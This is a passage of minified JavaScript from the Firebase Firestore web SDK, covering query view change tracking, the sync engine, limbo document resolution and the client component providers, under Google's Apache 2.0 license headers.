 */class PA{constructor(){this.ma=new un(Pe.comparator)}track(e){const n=e.doc.key,i=this.ma.get(n);i?e.type!==0&&i.type===3?this.ma=this.ma.insert(n,e):e.type===3&&i.type!==1?this.ma=this.ma.insert(n,{type:i.type,doc:e.doc}):e.type===2&&i.type===2?this.ma=this.ma.insert(n,{type:2,doc:e.doc}):e.type===2&&i.type===0?this.ma=this.ma.insert(n,{type:0,doc:e.doc}):e.type===1&&i.type===0?this.ma=this.ma.remove(n):e.type===1&&i.type===2?this.ma=this.ma.insert(n,{type:1,doc:i.doc}):e.type===0&&i.type===1?this.ma=this.ma.insert(n,{type:2,doc:e.doc}):ze(63341,{Vt:e,fa:i}):this.ma=this.ma.insert(n,e)}ga(){const e=[];return this.ma.inorderTraversal((n,i)=>{e.push(i)}),e}}class _c{constructor(e,n,i,s,o,c,d,f,p){this.query=e,this.docs=n,this.oldDocs=i,this.docChanges=s,this.mutatedKeys=o,this.fromCache=c,this.syncStateChanged=d,this.excludesMetadataChanges=f,this.hasCachedResults=p}static fromInitialDocuments(e,n,i,s,o){const c=[];return n.forEach(d=>{c.push({type:0,doc:d})}),new _c(e,n,nc.emptySet(n),c,i,s,!0,!1,o)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&up(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const n=this.docChanges,i=e.docChanges;if(n.length!==i.length)return!1;for(let s=0;s<n.length;s++)if(n[s].type!==i[s].type||!n[s].doc.isEqual(i[s].doc))return!1;return!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Q9{constructor(){this.pa=void 0,this.ya=[]}wa(){return this.ya.some(e=>e.Sa())}}class K9{constructor(){this.queries=jA(),this.onlineState="Unknown",this.ba=new Set}terminate(){(function(n,i){const s=Qe(n),o=s.queries;s.queries=jA(),o.forEach((c,d)=>{for(const f of d.ya)f.onError(i)})})(this,new ke(fe.ABORTED,"Firestore shutting down"))}}function jA(){return new nl(t=>mS(t),up)}async function b_(t,e){const n=Qe(t);let i=3;const s=e.query;let o=n.queries.get(s);o?!o.wa()&&e.Sa()&&(i=2):(o=new Q9,i=e.Sa()?0:1);try{switch(i){case 0:o.pa=await n.onListen(s,!0);break;case 1:o.pa=await n.onListen(s,!1);break;case 2:await n.onFirstRemoteStoreListen(s)}}catch(c){const d=w_(c,`Initialization of query '${Wl(e.query)}' failed`);return void e.onError(d)}n.queries.set(s,o),o.ya.push(e),e.Da(n.onlineState),o.pa&&e.va(o.pa)&&A_(n)}async function x_(t,e){const n=Qe(t),i=e.query;let s=3;const o=n.queries.get(i);if(o){const c=o.ya.indexOf(e);c>=0&&(o.ya.splice(c,1),o.ya.length===0?s=e.Sa()?0:1:!o.wa()&&e.Sa()&&(s=2))}switch(s){case 0:return n.queries.delete(i),n.onUnlisten(i,!0);case 1:return n.queries.delete(i),n.onUnlisten(i,!1);case 2:return n.onLastRemoteStoreUnlisten(i);default:return}}function W9(t,e){const n=Qe(t);let i=!1;for(const s of e){const o=s.query,c=n.queries.get(o);if(c){for(const d of c.ya)d.va(s)&&(i=!0);c.pa=s}}i&&A_(n)}function $9(t,e,n){const i=Qe(t),s=i.queries.get(e);if(s)for(const o of s.ya)o.onError(n);i.queries.delete(e)}function A_(t){t.ba.forEach(e=>{e.next()})}var W0,LA;(LA=W0||(W0={})).Ca="default",LA.Cache="cache";class E_{constructor(e,n,i){this.query=e,this.Fa=n,this.Ma=!1,this.xa=null,this.onlineState="Unknown",this.options=i||{}}va(e){if(!this.options.includeMetadataChanges){const i=[];for(const s of e.docChanges)s.type!==3&&i.push(s);e=new _c(e.query,e.docs,e.oldDocs,i,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let n=!1;return this.Ma?this.Oa(e)&&(this.Fa.next(e),n=!0):this.Na(e,this.onlineState)&&(this.Ba(e),n=!0),this.xa=e,n}onError(e){this.Fa.error(e)}Da(e){this.onlineState=e;let n=!1;return this.xa&&!this.Ma&&this.Na(this.xa,e)&&(this.Ba(this.xa),n=!0),n}Na(e,n){if(!e.fromCache||!this.Sa())return!0;const i=n!=="Offline";return(!this.options.La||!i)&&(!e.docs.isEmpty()||e.hasCachedResults||n==="Offline")}Oa(e){if(e.docChanges.length>0)return!0;const n=this.xa&&this.xa.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!n)&&this.options.includeMetadataChanges===!0}Ba(e){e=_c.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.Ma=!0,this.Fa.next(e)}Sa(){return this.options.source!==W0.Cache}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class KS{constructor(e){this.key=e}}class WS{constructor(e){this.key=e}}class X9{constructor(e,n){this.query=e,this.Ga=n,this.za=null,this.hasCachedResults=!1,this.current=!1,this.ja=ct(),this.mutatedKeys=ct(),this.Ha=pS(e),this.Ja=new nc(this.Ha)}get Ya(){return this.Ga}Za(e,n){const i=n?n.Xa:new PA,s=n?n.Ja:this.Ja;let o=n?n.mutatedKeys:this.mutatedKeys,c=s,d=!1;const f=this.query.limitType==="F"&&s.size===this.query.limit?s.last():null,p=this.query.limitType==="L"&&s.size===this.query.limit?s.first():null;if(e.inorderTraversal((v,b)=>{const w=s.get(v),E=dp(this.query,b)?b:null,C=!!w&&this.mutatedKeys.has(w.key),M=!!E&&(E.hasLocalMutations||this.mutatedKeys.has(E.key)&&E.hasCommittedMutations);let V=!1;w&&E?w.data.isEqual(E.data)?C!==M&&(i.track({type:3,doc:E}),V=!0):this.eu(w,E)||(i.track({type:2,doc:E}),V=!0,(f&&this.Ha(E,f)>0||p&&this.Ha(E,p)<0)&&(d=!0)):!w&&E?(i.track({type:0,doc:E}),V=!0):w&&!E&&(i.track({type:1,doc:w}),V=!0,(f||p)&&(d=!0)),V&&(E?(c=c.add(E),o=M?o.add(v):o.delete(v)):(c=c.delete(v),o=o.delete(v)))}),this.query.limit!==null)for(;c.size>this.query.limit;){const v=this.query.limitType==="F"?c.last():c.first();c=c.delete(v.key),o=o.delete(v.key),i.track({type:1,doc:v})}return{Ja:c,Xa:i,Cs:d,mutatedKeys:o}}eu(e,n){return e.hasLocalMutations&&n.hasCommittedMutations&&!n.hasLocalMutations}applyChanges(e,n,i,s){const o=this.Ja;this.Ja=e.Ja,this.mutatedKeys=e.mutatedKeys;const c=e.Xa.ga();c.sort((v,b)=>function(E,C){const M=V=>{switch(V){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return ze(20277,{Vt:V})}};return M(E)-M(C)}(v.type,b.type)||this.Ha(v.doc,b.doc)),this.tu(i),s=s!=null&&s;const d=n&&!s?this.nu():[],f=this.ja.size===0&&this.current&&!s?1:0,p=f!==this.za;return this.za=f,c.length!==0||p?{snapshot:new _c(this.query,e.Ja,o,c,e.mutatedKeys,f===0,p,!1,!!i&&i.resumeToken.approximateByteSize()>0),ru:d}:{ru:d}}Da(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({Ja:this.Ja,Xa:new PA,mutatedKeys:this.mutatedKeys,Cs:!1},!1)):{ru:[]}}iu(e){return!this.Ga.has(e)&&!!this.Ja.has(e)&&!this.Ja.get(e).hasLocalMutations}tu(e){e&&(e.addedDocuments.forEach(n=>this.Ga=this.Ga.add(n)),e.modifiedDocuments.forEach(n=>{}),e.removedDocuments.forEach(n=>this.Ga=this.Ga.delete(n)),this.current=e.current)}nu(){if(!this.current)return[];const e=this.ja;this.ja=ct(),this.Ja.forEach(i=>{this.iu(i.key)&&(this.ja=this.ja.add(i.key))});const n=[];return e.forEach(i=>{this.ja.has(i)||n.push(new WS(i))}),this.ja.forEach(i=>{e.has(i)||n.push(new KS(i))}),n}su(e){this.Ga=e.$s,this.ja=ct();const n=this.Za(e.documents);return this.applyChanges(n,!0)}ou(){return _c.fromInitialDocuments(this.query,this.Ja,this.mutatedKeys,this.za===0,this.hasCachedResults)}}const T_="SyncEngine";class Z9{constructor(e,n,i){this.query=e,this.targetId=n,this.view=i}}class J9{constructor(e){this.key=e,this._u=!1}}class ej{constructor(e,n,i,s,o,c){this.localStore=e,this.remoteStore=n,this.eventManager=i,this.sharedClientState=s,this.currentUser=o,this.maxConcurrentLimboResolutions=c,this.au={},this.uu=new nl(d=>mS(d),up),this.cu=new Map,this.lu=new Set,this.hu=new un(Pe.comparator),this.Pu=new Map,this.Tu=new d_,this.Iu={},this.Eu=new Map,this.du=vc.lr(),this.onlineState="Unknown",this.Au=void 0}get isPrimaryClient(){return this.Au===!0}}async function tj(t,e,n=!0){const i=t4(t);let s;const o=i.uu.get(e);return o?(i.sharedClientState.addLocalQueryTarget(o.targetId),s=o.view.ou()):s=await $S(i,e,n,!0),s}async function nj(t,e){const n=t4(t);await $S(n,e,!0,!1)}async function $S(t,e,n,i){const s=await x9(t.localStore,Wr(e)),o=s.targetId,c=t.sharedClientState.addLocalQueryTarget(o,n);let d;return i&&(d=await ij(t,e,o,c==="current",s.resumeToken)),t.isPrimaryClient&&n&&FS(t.remoteStore,s),d}async function ij(t,e,n,i,s){t.Ru=(b,w,E)=>async function(M,V,B,Y){let D=V.view.Za(B);D.Cs&&(D=await RA(M.localStore,V.query,!1).then(({documents:N})=>V.view.Za(N,D)));const Q=Y&&Y.targetChanges.get(V.targetId),G=Y&&Y.targetMismatches.get(V.targetId)!=null,L=V.view.applyChanges(D,M.isPrimaryClient,Q,G);return UA(M,V.targetId,L.ru),L.snapshot}(t,b,w,E);const o=await RA(t.localStore,e,!0),c=new X9(e,o.$s),d=c.Za(o.documents),f=Yd.createSynthesizedTargetChangeForCurrentChange(n,i&&t.onlineState!=="Offline",s),p=c.applyChanges(d,t.isPrimaryClient,f);UA(t,n,p.ru);const v=new Z9(e,n,c);return t.uu.set(e,v),t.cu.has(n)?t.cu.get(n).push(e):t.cu.set(n,[e]),p.snapshot}async function rj(t,e,n){const i=Qe(t),s=i.uu.get(e),o=i.cu.get(s.targetId);if(o.length>1)return i.cu.set(s.targetId,o.filter(c=>!up(c,e))),void i.uu.delete(e);i.isPrimaryClient?(i.sharedClientState.removeLocalQueryTarget(s.targetId),i.sharedClientState.isActiveQueryTarget(s.targetId)||await Q0(i.localStore,s.targetId,!1).then(()=>{i.sharedClientState.clearQueryState(s.targetId),n&&p_(i.remoteStore,s.targetId),$0(i,s.targetId)}).catch(Lc)):($0(i,s.targetId),await Q0(i.localStore,s.targetId,!0))}async function sj(t,e){const n=Qe(t),i=n.uu.get(e),s=n.cu.get(i.targetId);n.isPrimaryClient&&s.length===1&&(n.sharedClientState.removeLocalQueryTarget(i.targetId),p_(n.remoteStore,i.targetId))}async function aj(t,e,n){const i=fj(t);try{const s=await function(c,d){const f=Qe(c),p=yn.now(),v=d.reduce((E,C)=>E.add(C.key),ct());let b,w;return f.persistence.runTransaction("Locally write mutations","readwrite",E=>{let C=Us(),M=ct();return f.Bs.getEntries(E,v).next(V=>{C=V,C.forEach((B,Y)=>{Y.isValidDocument()||(M=M.add(B))})}).next(()=>f.localDocuments.getOverlayedDocuments(E,C)).next(V=>{b=V;const B=[];for(const Y of d){const D=x8(Y,b.get(Y.key).overlayedDocument);D!=null&&B.push(new Za(Y.key,D,oS(D.value.mapValue),ar.exists(!0)))}return f.mutationQueue.addMutationBatch(E,p,B,d)}).next(V=>{w=V;const B=V.applyToLocalDocumentSet(b,M);return f.documentOverlayCache.saveOverlays(E,V.batchId,B)})}).then(()=>({batchId:w.batchId,changes:yS(b)}))}(i.localStore,e);i.sharedClientState.addPendingMutation(s.batchId),function(c,d,f){let p=c.Iu[c.currentUser.toKey()];p||(p=new un(Xe)),p=p.insert(d,f),c.Iu[c.currentUser.toKey()]=p}(i,s.batchId,n),await Kd(i,s.changes),await yp(i.remoteStore)}catch(s){const o=w_(s,"Failed to persist write");n.reject(o)}}async function XS(t,e){const n=Qe(t);try{const i=await _9(n.localStore,e);e.targetChanges.forEach((s,o)=>{const c=n.Pu.get(o);c&&(St(s.addedDocuments.size+s.modifiedDocuments.size+s.removedDocuments.size<=1,22616),s.addedDocuments.size>0?c._u=!0:s.modifiedDocuments.size>0?St(c._u,14607):s.removedDocuments.size>0&&(St(c._u,42227),c._u=!1))}),await Kd(n,i,e)}catch(i){await Lc(i)}}function VA(t,e,n){const i=Qe(t);if(i.isPrimaryClient&&n===0||!i.isPrimaryClient&&n===1){const s=[];i.uu.forEach((o,c)=>{const d=c.view.Da(e);d.snapshot&&s.push(d.snapshot)}),function(c,d){const f=Qe(c);f.onlineState=d;let p=!1;f.queries.forEach((v,b)=>{for(const w of b.ya)w.Da(d)&&(p=!0)}),p&&A_(f)}(i.eventManager,e),s.length&&i.au.j_(s),i.onlineState=e,i.isPrimaryClient&&i.sharedClientState.setOnlineState(e)}}async function oj(t,e,n){const i=Qe(t);i.sharedClientState.updateQueryState(e,"rejected",n);const s=i.Pu.get(e),o=s&&s.key;if(o){let c=new un(Pe.comparator);c=c.insert(o,Wn.newNoDocument(o,Ye.min()));const d=ct().add(o),f=new mp(Ye.min(),new Map,new un(Xe),c,d);await XS(i,f),i.hu=i.hu.remove(o),i.Pu.delete(e),C_(i)}else await Q0(i.localStore,e,!1).then(()=>$0(i,e,n)).catch(Lc)}async function lj(t,e){const n=Qe(t),i=e.batch.batchId;try{const s=await v9(n.localStore,e);JS(n,i,null),ZS(n,i),n.sharedClientState.updateMutationState(i,"acknowledged"),await Kd(n,s)}catch(s){await Lc(s)}}async function cj(t,e,n){const i=Qe(t);try{const s=await function(c,d){const f=Qe(c);return f.persistence.runTransaction("Reject batch","readwrite-primary",p=>{let v;return f.mutationQueue.lookupMutationBatch(p,d).next(b=>(St(b!==null,37113),v=b.keys(),f.mutationQueue.removeMutationBatch(p,b))).next(()=>f.mutationQueue.performConsistencyCheck(p)).next(()=>f.documentOverlayCache.removeOverlaysForBatchId(p,v,d)).next(()=>f.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(p,v)).next(()=>f.localDocuments.getDocuments(p,v))})}(i.localStore,e);JS(i,e,n),ZS(i,e),i.sharedClientState.updateMutationState(e,"rejected",n),await Kd(i,s)}catch(s){await Lc(s)}}function ZS(t,e){(t.Eu.get(e)||[]).forEach(n=>{n.resolve()}),t.Eu.delete(e)}function JS(t,e,n){const i=Qe(t);let s=i.Iu[i.currentUser.toKey()];if(s){const o=s.get(e);o&&(n?o.reject(n):o.resolve(),s=s.remove(e)),i.Iu[i.currentUser.toKey()]=s}}function $0(t,e,n=null){t.sharedClientState.removeLocalQueryTarget(e);for(const i of t.cu.get(e))t.uu.delete(i),n&&t.au.Vu(i,n);t.cu.delete(e),t.isPrimaryClient&&t.Tu.Hr(e).forEach(i=>{t.Tu.containsKey(i)||e4(t,i)})}function e4(t,e){t.lu.delete(e.path.canonicalString());const n=t.hu.get(e);n!==null&&(p_(t.remoteStore,n),t.hu=t.hu.remove(e),t.Pu.delete(n),C_(t))}function UA(t,e,n){for(const i of n)i instanceof KS?(t.Tu.addReference(i.key,e),uj(t,i)):i instanceof WS?(xe(T_,"Document no longer in limbo: "+i.key),t.Tu.removeReference(i.key,e),t.Tu.containsKey(i.key)||e4(t,i.key)):ze(19791,{mu:i})}function uj(t,e){const n=e.key,i=n.path.canonicalString();t.hu.get(n)||t.lu.has(i)||(xe(T_,"New document in limbo: "+n),t.lu.add(i),C_(t))}function C_(t){for(;t.lu.size>0&&t.hu.size<t.maxConcurrentLimboResolutions;){const e=t.lu.values().next().value;t.lu.delete(e);const n=new Pe(qt.fromString(e)),i=t.du.next();t.Pu.set(i,new J9(n)),t.hu=t.hu.insert(n,i),FS(t.remoteStore,new ka(Wr(cp(n.path)),i,"TargetPurposeLimboResolution",sp.le))}}async function Kd(t,e,n){const i=Qe(t),s=[],o=[],c=[];i.uu.isEmpty()||(i.uu.forEach((d,f)=>{c.push(i.Ru(f,e,n).then(p=>{var v;if((p||n)&&i.isPrimaryClient){const b=p?!p.fromCache:(v=n==null?void 0:n.targetChanges.get(f.targetId))===null||v===void 0?void 0:v.current;i.sharedClientState.updateQueryState(f.targetId,b?"current":"not-current")}if(p){s.push(p);const b=f_.Rs(f.targetId,p);o.push(b)}}))}),await Promise.all(c),i.au.j_(s),await async function(f,p){const v=Qe(f);try{await v.persistence.runTransaction("notifyLocalViewChanges","readwrite",b=>de.forEach(p,w=>de.forEach(w.ds,E=>v.persistence.referenceDelegate.addReference(b,w.targetId,E)).next(()=>de.forEach(w.As,E=>v.persistence.referenceDelegate.removeReference(b,w.targetId,E)))))}catch(b){if(!Vc(b))throw b;xe(m_,"Failed to update sequence numbers: "+b)}for(const b of p){const w=b.targetId;if(!b.fromCache){const E=v.xs.get(w),C=E.snapshotVersion,M=E.withLastLimboFreeSnapshotVersion(C);v.xs=v.xs.insert(w,M)}}}(i.localStore,o))}async function dj(t,e){const n=Qe(t);if(!n.currentUser.isEqual(e)){xe(T_,"User change. New user:",e.toKey());const i=await VS(n.localStore,e);n.currentUser=e,function(o,c){o.Eu.forEach(d=>{d.forEach(f=>{f.reject(new ke(fe.CANCELLED,c))})}),o.Eu.clear()}(n,"'waitForPendingWrites' promise is rejected due to a user change."),n.sharedClientState.handleUserChange(e,i.removedBatchIds,i.addedBatchIds),await Kd(n,i.ks)}}function hj(t,e){const n=Qe(t),i=n.Pu.get(e);if(i&&i._u)return ct().add(i.key);{let s=ct();const o=n.cu.get(e);if(!o)return s;for(const c of o){const d=n.uu.get(c);s=s.unionWith(d.view.Ya)}return s}}function t4(t){const e=Qe(t);return e.remoteStore.remoteSyncer.applyRemoteEvent=XS.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=hj.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=oj.bind(null,e),e.au.j_=W9.bind(null,e.eventManager),e.au.Vu=$9.bind(null,e.eventManager),e}function fj(t){const e=Qe(t);return e.remoteStore.remoteSyncer.applySuccessfulWrite=lj.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=cj.bind(null,e),e}class Am{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=pp(e.databaseInfo.databaseId),this.sharedClientState=this.pu(e),this.persistence=this.yu(e),await this.persistence.start(),this.localStore=this.wu(e),this.gcScheduler=this.Su(e,this.localStore),this.indexBackfillerScheduler=this.bu(e,this.localStore)}Su(e,n){return null}bu(e,n){return null}wu(e){return y9(this.persistence,new m9,e.initialUser,this.serializer)}yu(e){return new LS(h_.fi,this.serializer)}pu(e){return new E9}async terminate(){var e,n;(e=this.gcScheduler)===null||e===void 0||e.stop(),(n=this.indexBackfillerScheduler)===null||n===void 0||n.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}Am.provider={build:()=>new Am};class mj extends Am{constructor(e){super(),this.cacheSizeBytes=e}Su(e,n){St(this.persistence.referenceDelegate instanceof bm,46915);const i=this.persistence.referenceDelegate.garbageCollector;return new J8(i,e.asyncQueue,n)}yu(e){const n=this.cacheSizeBytes!==void 0?mi.withCacheSize(this.cacheSizeBytes):mi.DEFAULT;return new LS(i=>bm.fi(i,n),this.serializer)}}class X0{async initialize(e,n){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(n),this.remoteStore=this.createRemoteStore(n),this.eventManager=this.createEventManager(n),this.syncEngine=this.createSyncEngine(n,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=i=>VA(this.syncEngine,i,1),this.remoteStore.remoteSyncer.handleCredentialChange=dj.bind(null,this.syncEngine),await Y9(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return function(){return new K9}()}createDatastore(e){const n=pp(e.databaseInfo.databaseId),i=function(o){return new R9(o)}(e.databaseInfo);return function(o,c,d,f){return new M9(o,c,d,f)}(e.authCredentials,e.appCheckCredentials,i,n)}createRemoteStore(e){return function(i,s,o,c,d){return new P9(i,s,o,c,d)}(this.localStore,this.datastore,e.asyncQueue,n=>VA(this.syncEngine,n,0),function(){return DA.C()?new DA:new T9}())}createSyncEngine(e,n){return function(s,o,c,d,f,p,v){const b=new ej(s,o,c,d,f,p);return v&&(b.Au=!0),b}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,n)}async terminate(){var e,n;await async function(s){const o=Qe(s);xe(qo,"RemoteStore shutting down."),o.Ta.add(5),await Qd(o),o.Ea.shutdown(),o.da.set("Unknown")}(this.remoteStore),(e=this.datastore)===null||e===void 0||e.terminate(),(n=this.eventManager)===null||n===void 0||n.terminate()}}X0.provider={build:()=>new X0};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class S_{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.vu(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.vu(this.observer.error,e):Vs("Uncaught Error in snapshot listener:",e.toString()))}Cu(){this.muted=!0}vu(e,n){setTimeout(()=>{this.muted||e(n)},0)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Qa="FirestoreClient";class pj{constructor(e,n,i,s,o){this.authCredentials=e,this.appCheckCredentials=n,this.asyncQueue=i,this.databaseInfo=s,this.user=Kn.UNAUTHENTICATED,this.clientId=XC.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=o,this.authCredentials.start(i,async c=>{xe(Qa,"Received user=",c.uid),await this.authCredentialListener(c),this.user=c}),this.appCheckCredentials.start(i,c=>(xe(Qa,"Received new app check token=",c),this.appCheckCredentialListener(c,this.user)))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new Ps;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(n){const i=w_(n,"Failed to shutdown persistence");e.reject(i)}}),e.promise}}async function c0(t,e){t.asyncQueue.verifyOperationInProgress(),xe(Qa,"Initializing OfflineComponentProvider");const n=t.configuration;await e.initialize(n);let i=n.initialUser;t.setCredentialChangeListener(async s=>{i.isEqual(s)||(await VS(e.localStore,s),i=s)}),e.persistence.setDatabaseDeletedListener(()=>t.terminate()),t._offlineComponents=e}async function BA(t,e){t.asyncQueue.verifyOperationInProgress();const n=await gj(t);xe(Qa,"Initializing OnlineComponentProvider"),await e.initialize(n,t.configuration),t.setCredentialChangeListener(i=>OA(e.remoteStore,i)),t.setAppCheckTokenChangeListener((i,s)=>OA(e.remoteStore,s)),t._onlineComponents=e}async function gj(t){if(!t._offlineComponents)if(t._uninitializedComponentsProvider){xe(Qa,"Using user provided OfflineComponentProvider");try{await c0(t,t._uninitializedComponentsProvider._offline)}catch(e){const n=e;if(!function(s){return s.name==="FirebaseError"?s.code===fe.FAILED_PRECONDITION||s.code===fe.UNIMPLEMENTED:!(typeof DOMException<"u"&&s instanceof DOMException)||s.code===22||s.code===20||s.code===11}(n))throw n;mc("Error using user provided cache. Falling back to memory cache: "+n),await c0(t,new Am)}}else xe(Qa,"Using default OfflineComponentProvider"),await c0(t,new mj(void 0));return t._offlineComponents}async function n4(t){return t._onlineComponents||(t._uninitializedComponentsProvider?(xe(Qa,"Using user provided OnlineComponentProvider"),await BA(t,t._uninitializedComponentsProvider._online)):(xe(Qa,"Using default OnlineComponentProvider"),await BA(t,new X0))),t._onlineComponents}function yj(t){return n4(t).then(e=>e.syncEngine)}async function Em(t){const e=await n4(t),n=e.eventManager;return n.onListen=tj.bind(null,e.syncEngine),n.onUnlisten=rj.bind(null,e.syncEngine),n.onFirstRemoteStoreListen=nj.bind(null,e.syncEngine),n.onLastRemoteStoreUnlisten=sj.bind(null,e.syncEngine),n}function vj(t,e,n={}){const i=new Ps;return t.asyncQueue.enqueueAndForget(async()=>function(o,c,d,f,p){const v=new S_({next:w=>{v.Cu(),c.enqueueAndForget(()=>x_(o,b));const E=w.docs.has(d);!E&&w.fromCache?p.reject(new ke(fe.UNAVAILABLE,"Failed to get document because the client is offline.")):E&&w.fromCache&&f&&f.source==="server"?p.reject(new ke(fe.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):p.resolve(w)},error:w=>p.reject(w)}),b=new E_(cp(d.path),v,{includeMetadataChanges:!0,La:!0});return b_(o,b)}(await Em(t),t.asyncQueue,e,n,i)),i.promise}function _j(t,e,n={}){const i=new Ps;return t.asyncQueue.enqueueAndForget(async()=>function(o,c,d,f,p){const v=new S_({next:w=>{v.Cu(),c.enqueueAndForget(()=>x_(o,b)),w.fromCache&&f.source==="server"?p.reject(new ke(fe.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):p.resolve(w)},error:w=>p.reject(w)}),b=new E_(d,v,{includeMetadataChanges:!0,La:!0});return b_(o,b)}(await Em(t),t.asyncQueue,e,n,i)),i.promise}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function i4(t){const e={};return t.timeoutSeconds!==void 0&&(e.timeoutSeconds=t.timeoutSeconds),e}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const zA=new Map;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
